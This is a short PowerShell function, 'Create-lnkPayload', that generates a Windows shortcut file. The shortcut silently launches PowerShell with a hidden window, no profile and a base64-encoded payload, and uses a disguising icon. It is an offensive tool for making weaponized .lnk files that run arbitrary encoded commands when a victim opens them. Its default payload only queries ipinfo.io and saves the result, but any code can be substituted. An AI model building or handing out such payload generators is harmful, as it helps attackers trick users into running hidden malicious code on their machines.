function Create-lnkPayload{
<#
    .SYNOPSIS
        Generates Windows lnk file
    .PARAMETER lnkName
        Name of lnk file to create
    .PARAMETER TargetPath
        Path to the exe you want to execute. Defaults to powershell.
    .PARAMETER Payload
        What to base64 and run.
   
   .EXAMPLE
        Create-lnkPayload -lnkName 'exampl.lnk' -Payload 'Invoke-RestMethod -Uri https://ipinfo.io/json | Out-File -FilePath .\ipinfo.txt.'
        
#>
    [CmdletBinding(DefaultParameterSetName = 'None')]
    param(

    [Parameter(Mandatory=$True)]
        [String]
        $LNKName,

        [Parameter()]
        [String]
        $TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",

        [Parameter()]
        [String]
        $Payload = "Invoke-RestMethod -Uri https://ipinfo.io/json | Out-File -FilePath .\ipinfo.txt"

    )
  
    $obj = New-Object -ComObject WScript.Shell
    $lnk = $obj.CreateShortcut($lnkName)
    $lnk.WindowStyle = '7'
    $lnk.TargetPath = $TargetPath
    $lnk.Arguments = "-nop -WindowStyle Hidden -enc $([System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))))"
    $lnk.IconLocation = "shell32.dll,70"
	$lnk.Save() 
}